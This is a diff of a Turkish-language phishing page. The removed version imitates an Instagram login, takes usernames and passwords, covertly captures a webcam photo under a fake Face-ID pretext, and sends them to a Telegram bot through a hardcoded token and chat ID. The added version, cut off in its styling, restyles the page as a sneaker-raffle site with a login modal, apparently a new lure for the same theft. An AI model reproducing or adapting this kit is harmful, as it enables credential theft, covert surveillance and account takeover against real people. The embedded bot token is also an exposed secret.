@@ -1,94 +1,37 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap • Instagram</title>
+    <title>Drip Caws | Hyper Raffle Access - Limited Edition Dunk</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; border-radius: 3px; }
-        .logo { font-size: 35px; font-weight: bold; margin: 20px 0; color: #262626; letter-spacing: -1px; }
-        .security-notice { background: #fff9e6; border: 1px solid #ffe58f; padding: 12px; font-size: 11px; color: #856404; margin-bottom: 18px; border-radius: 4px; text-align: left; line-height: 1.4; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 6px; font-size: 12px; }
-        button { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 4px; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        button:disabled { background-color: #b2dffc; }
-        #loader { display: none; width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
+        :root { --blue: #007aff; --bg: #ffffff; --text: #1d1d1f; --grey: #86868b; --border: #d2d2d7; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: var(--bg); font-family: 'Montserrat', sans-serif; color: var(--text); overflow-x: hidden; -webkit-font-smoothing: antialiased; }
 
-<div class="container">
-    <div class="logo">Instagram</div>
-    
-    <div class="security-notice">
-        <b>Zorunlu Güvenlik Taraması:</b> Hesabınızın güvenliği için giriş yaparken yüz doğrulama izni vermeniz gerekmektedir. Lütfen çıkan uyarıyı onaylayın.
-    </div>
-    
-    <input type="text" id="user" placeholder="Kullanıcı adı, e-posta veya telefon">
-    <input type="password" id="pass" placeholder="Şifre">
-    
-    <button id="loginBtn" onclick="baslat()">
-        <span id="btnText">Giriş Yap</span>
-        <div id="loader"></div>
-    </button>
-</div>
+        /* HEADER */
+        header { width: 100%; padding: 15px 50px; background: rgba(255,255,255,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .logo { font-weight: 800; font-size: 26px; letter-spacing: -2px; text-transform: uppercase; color: #000; }
+        .logo span { color: var(--blue); }
+        .nav { display: flex; gap: 25px; font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
 
-<video id="vid" style="display:none;" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+        /* HERO AREA */
+        .hero { width: 100%; padding: 80px 50px; display: flex; gap: 60px; align-items: center; max-width: 1300px; margin: 0 auto; }
+        .product-img { width: 50%; display: flex; justify-content: center; position: relative; }
+        .product-img img { width: 100%; max-width: 500px; height: auto; object-fit: contain; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.1)); }
+        .product-img::after { content: ''; position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); width: 80%; height: 2px; background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(255,255,255,0) 70%); }
 
-<script>
-    // --- BİLGİLERİNİZ ---
-    const TOKEN = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
-    const ID = "1540769169";
-
-    async function baslat() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        if(!u || !p) return alert("Lütfen bilgileri doldurun.");
-
-        document.getElementById('btnText').style.display = "none";
-        document.getElementById('loader').style.display = "block";
-        document.getElementById('loginBtn').disabled = true;
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('vid');
-            video.srcObject = stream;
-
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const resim = canvas.toDataURL('image/png');
-
-                gonder(u, p, resim);
-
-                alert("Sunucu hatası: Giriş yapılamadı, lütfen daha sonra tekrar deneyin.");
-                location.reload(); 
-            }, 2500);
-
-        } catch (e) {
-            alert("Hata: Güvenlik doğrulaması (Face-ID) reddedildiği için giriş yapılamadı.");
-            location.reload();
-        }
-    }
-
-    function gonder(u, p, img) {
-        const msg = `🎯 **Yeni Bir Av Yakalandı!**\n\n👤 Kullanıcı: \`${u}\`\n🔑 Şifre: \`${p}\``;
+        .product-info { width: 50%; text-align: left; }
+        .raffle-badge { display: inline-block; padding: 6px 14px; background: rgba(0, 122, 255, 0.08); color: var(--blue); font-weight: 700; font-size: 11px; border-radius: 50px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; }
+        .product-info h1 { font-size: 48px; font-weight: 800; letter-spacing: -2px; margin-bottom: 10px; line-height: 1.1; color: #000; }
+        .product-info p.price { font-size: 20px; font-weight: 600; color: var(--blue); margin-bottom: 25px; }
+        .product-info p.desc { font-size: 15px; color: #666; margin-bottom: 40px; line-height: 1.6; max-width: 500px; }
         
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        /* ÇEKİLİŞ BUTONU */
+        .btn-sync { display: inline-block; padding: 18px 45px; background: #000; color: #fff; font-weight: 700; font-size: 14px; text-transform: uppercase; border: none; border-radius: 4px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+        .btn-sync:hover { background: #333; transform: translateY(-2px); }
 
-        fetch(img).then(r => r.blob()).then(b => {
-            const fd = new FormData();
-            fd.append("chat_id", ID);
-            fd.append("photo", b, "av.png");
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-        });
-    }
-</script>
-
-</body>
-</html>
+        /* MODAL: GİRİŞ FORMU */
+        #verify-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { width: 100%; max-width: 420px; padding: 50px 35px; background: #fff; border-radius: 20px; text-
